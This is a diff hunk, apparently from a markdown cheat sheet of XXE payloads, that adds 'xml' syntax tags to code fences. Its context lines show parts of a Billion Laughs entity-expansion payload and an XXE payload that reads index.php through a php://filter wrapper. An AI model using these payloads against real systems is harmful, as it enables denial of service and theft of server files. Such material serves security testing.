@@ -58,7 +58,7 @@
 ```
 
 ### Billion Laugh Attack
-```
+```xml
 <!DOCTYPE data [
 <!ENTITY a0 "dos" >
 <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
@@ -70,7 +70,7 @@
 ```
 
 ### PHP Wrapper
-```
+```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
   <contact>
